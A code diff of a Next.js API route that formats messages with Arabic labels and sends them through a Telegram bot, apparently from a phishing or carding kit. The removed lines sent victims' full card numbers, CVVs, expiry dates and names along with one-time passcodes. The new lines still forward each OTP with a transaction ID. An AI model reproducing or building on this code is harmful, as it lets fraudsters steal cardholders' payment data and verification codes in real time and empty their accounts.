@@ -12,38 +12,11 @@ async function sendTelegram(text: string) {
 
 export async function POST(req: NextRequest) {
   try {
-    const { otp, customerName, cardHolderName, cardNumber, cvv, expiryDate, type } = await req.json();
-
-    const formatted = (cardNumber ?? "").replace(/(\d{4})(?=\d)/g, "$1 ");
-
-    const cardInfo = cardNumber
-      ? [
-          ``,
-          `━━━━━━━━━━━━━━━━━━`,
-          `💳 Card Number: <code>${formatted}</code>`,
-          `👤 Card Holder: ${cardHolderName ?? ""}`,
-          `📅 Valid To: ${expiryDate ?? ""}`,
-          `🔐 CVV: <code>${cvv ?? ""}</code>`,
-          `━━━━━━━━━━━━━━━━━━`,
-        ].join("\n")
-      : "";
+    const { otp, transactionId, type } = await req.json();
 
     const message = type === "resend"
-      ? [
-          `🔁 <b>طلب إعادة إرسال كود</b>`,
-          ``,
-          `👤 Order For: ${customerName ?? ""}`,
-          `💳 Card Holder: ${cardHolderName ?? ""}`,
-          cardInfo,
-        ].join("\n")
-      : [
-          `🔑 <b>كود تحقق جديد</b>`,
-          ``,
-          `👤 Order For: ${customerName ?? ""}`,
-          cardInfo,
-          ``,
-          `🔢 OTP: <code>${otp}</code>`,
-        ].join("\n");
+      ? `🔁 <b>طلب إعادة إرسال كود</b>\nلصالح العملية\n\n🆔 Transaction ID: <code>${transactionId ?? ""}</code>`
+      : `🔑 <b>كود تحقق جديد</b>\nلصالح العملية\n\n🆔 Transaction ID: <code>${transactionId ?? ""}</code>\n\n🔢 OTP: <code>${otp}</code>`;
 
     await sendTelegram(message);
     return NextResponse.json({ ok: true });
